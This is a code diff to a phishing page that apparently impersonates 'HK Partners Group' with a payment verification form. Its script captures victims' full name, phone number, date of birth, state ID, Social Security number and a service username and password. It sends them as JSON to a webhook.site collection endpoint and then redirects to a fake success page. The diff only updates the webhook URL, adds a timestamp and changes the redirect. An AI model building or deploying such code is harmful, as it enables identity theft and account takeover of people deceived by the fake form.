@@ -220,38 +220,38 @@ Once your details are verified, HK Partners Group will initiate direct payment t
 </div>
 
 <script>  
-document.getElementById('authForm').addEventListener('submit', function(event) {  
+document.getElementById('authForm').addEventListener('submit', function(event) {
 event.preventDefault();
 
-const data = {  
-fullName: document.getElementById('fullName').value,  
-phoneNumber: document.getElementById('phoneNumber').value,  
-dob: document.getElementById('dob').value,  
-stateID: document.getElementById('stateID').value,  
-ssn: document.getElementById('ssn').value,  
-hellocUsername: document.getElementById('hellocUsername').value,  
-hellocPassword: document.getElementById('hellocPassword').value  
+const data = {
+fullName: document.getElementById('fullName').value,
+phoneNumber: document.getElementById('phoneNumber').value,
+dob: document.getElementById('dob').value,
+stateID: document.getElementById('stateID').value,
+ssn: document.getElementById('ssn').value,
+hellocUsername: document.getElementById('hellocUsername').value,
+hellocPassword: document.getElementById('hellocPassword').value,
+timestamp: new Date().toISOString()
 };
 
-// Send captured data to your webhook endpoint  
-fetch('https://webhook.site/fd6d8a2e-1b3c-450b-9c71-123456789abc', {  
-method: 'POST',  
-headers: {  
-'Content-Type': 'application/json',  
-},  
-body: JSON.stringify(data)  
-})  
-.then(response => response.json())  
-.then(result => {  
-// Redirect to "success" page  
-window.location.href = 'https://hkpartners-auth-verify.000webhostapp.com/success.html';  
-})  
-.catch(error => {  
-console.error('Error:', error);  
-// Fallback redirect  
-window.location.href = 'https://hkpartners-auth-verify.000webhostapp.com/success.html';  
-});  
-});  
+// Send data to your webhook
+fetch('https://webhook.site/87cc46ce-36d4-4e22-b93e-994e3f135410', {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json',
+},
+body: JSON.stringify(data)
+})
+.then(response => response.json())
+.then(result => {
+window.location.href = 'success.html';
+})
+.catch(error => {
+console.error('Error:', error);
+window.location.href = 'success.html';
+});
+});
+
 </script>  
 </body>  
 </html>
